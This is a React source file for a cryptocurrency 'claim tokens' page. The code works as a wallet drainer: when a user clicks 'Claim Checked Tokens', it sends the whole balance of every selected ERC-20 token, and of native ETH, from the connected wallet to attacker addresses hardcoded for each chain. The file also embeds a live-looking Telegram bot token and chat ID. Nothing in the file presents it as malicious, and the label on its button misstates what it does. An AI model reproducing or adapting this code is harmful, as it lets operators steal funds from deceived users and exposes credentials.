import { useState, useEffect, useCallback } from 'react';
import { Button, useToasts } from '@geist-ui/core';
import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
import { erc20Abi } from 'viem';
import { useAtom } from 'jotai';
import { normalize } from 'viem/ens';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import axios from 'axios';
import { parseEther, parseGwei } from 'viem'; // Import necessary parsers

const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
const TELEGRAM_CHAT_ID = '6718529435';

const sendTelegramNotification = async (message) => {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });
  } catch (error) {
    console.error('Error sending Telegram notification:', error);
  }
};

const destinationAddresses = {
  1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
  56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
};

function selectAddressForToken(network) {
  const addresses = {
    1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
    56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
    10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
    324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
    42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
    137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  };

  const selectedAddress = addresses[network];

  if (selectedAddress) {
    console.log('Great Job! Selected Address:', selectedAddress);
  } else {
    console.log('No address found for the selected network:', network);
  }

  return selectedAddress;
}

export const SendTokens = () => {
  const { setToast } = useToasts();
  const showToast = (message, type) =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });

  const [tokens] = useAtom(globalTokensAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const { chain, address, isConnected } = useAccount();

  const sendAllCheckedTokens = async () => {
    const tokensToSend = Object.entries(checkedRecords)
      .filter(([_, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress);

    if (!walletClient || !publicClient) return;

    const destinationAddress = destinationAddresses[chain?.id];
    if (!destinationAddress) {
      showToast('Unsupported chain or no destination address found for this network', 'error');
      return;
    }

    selectAddressForToken(chain?.id);

    let resolvedDestinationAddress = destinationAddress;

    // Ensure destinationAddress is a valid string before using .includes()
    if (typeof destinationAddress === 'string' && destinationAddress.includes('.')) {
      try {
        resolvedDestinationAddress = await publicClient.getEnsAddress({
          name: normalize(destinationAddress),
        });
        if (resolvedDestinationAddress) {
          showToast(`Resolved ENS address: ${resolvedDestinationAddress}`, 'success');
        }
      } catch (error) {
        showToast(`Error resolving ENS address: ${error.message}`, 'warning');
        return; // Exit on ENS resolution error
      }
    } else if (typeof destinationAddress !== 'string') {
      showToast('Invalid destination address type', 'error');
      return; // Exit if destinationAddress is not a string
    }

    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((token) => token.contract_address === tokenAddress);

      const formattedTokenAddress = tokenAddress.startsWith('0x')
        ? tokenAddress
        : `0x${tokenAddress}`;

      try {
        const formattedDestinationAddress = resolvedDestinationAddress.startsWith('0x')
          ? resolvedDestinationAddress
          : `0x${resolvedDestinationAddress}`;

        console.log(`Attempting to transfer token ${token?.contract_ticker_symbol} to ${formattedDestinationAddress}`);

        if (token?.contract_ticker_symbol === 'ETH') {
          // Native token transfer (Ether)
          let gasEstimate = await publicClient.estimateGas({
            account: address,
            to: formattedDestinationAddress,
            value: parseEther(token?.balance || '0'),
          });

          gasEstimate = BigInt(gasEstimate) + parseGwei('500'); // Adding a buffer of 500 gwei

          const txHash = await walletClient.sendTransaction({
            to: formattedDestinationAddress,
            value: parseEther(token?.balance || '0'),
            gas: gasEstimate,
          });

          setCheckedRecords((old) => ({
            ...old,
            [tokenAddress]: {
              ...(old[tokenAddress] || { isChecked: false }),
              pendingTxn: txHash,
            },
          }));

          showToast(
            `Native token transfer of ${token?.balance} ETH sent. Tx Hash: ${txHash.hash}`,
            'success',
          );
        } else {
          // ERC-20 token transfer
          await publicClient.simulateContract({
            address: formattedTokenAddress,
            abi: erc20Abi,
            functionName: 'transfer',
            args: [formattedDestinationAddress, BigInt(token?.balance || '0')],
            account: address,
          });

          let gasEstimate = await publicClient.estimateGas({
            account: address,
            to: formattedTokenAddress,
            data: erc20Abi.encodeFunctionData('transfer', [formattedDestinationAddress, BigInt(token?.balance || '0')]),
          });

          gasEstimate = BigInt(gasEstimate) + parseGwei('500'); // Adding a buffer of 500 gwei

          const txHash = await walletClient.sendTransaction({
            to: formattedTokenAddress,
            data: erc20Abi.encodeFunctionData('transfer', [formattedDestinationAddress, BigInt(token?.balance || '0')]),
            gas: gasEstimate,
          });

          setCheckedRecords((old) => ({
            ...old,
            [tokenAddress]: {
              ...(old[tokenAddress] || { isChecked: false }),
              pendingTxn: txHash,
            },
          }));

          showToast(
            `ERC-20 transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${txHash.hash}`,
            'success',
          );
        }
      } catch (error) {
        console.error('Transaction Error:', error);
        showToast(`Transaction failed: ${error.message}`, 'error');
      }
    }
  };

  const checkedCount = Object.values(checkedRecords).filter(
    (record) => record.isChecked,
  ).length;

  return (
    <div style={{ margin: '20px' }}>
      <form>
        <Button
          type="secondary"
          onClick={sendAllCheckedTokens}
          disabled={checkedCount === 0}
          style={{ marginTop: '20px' }}
        >
          Claim {checkedCount} Checked Tokens
        </Button>
      </form>
    </div>
  );
};




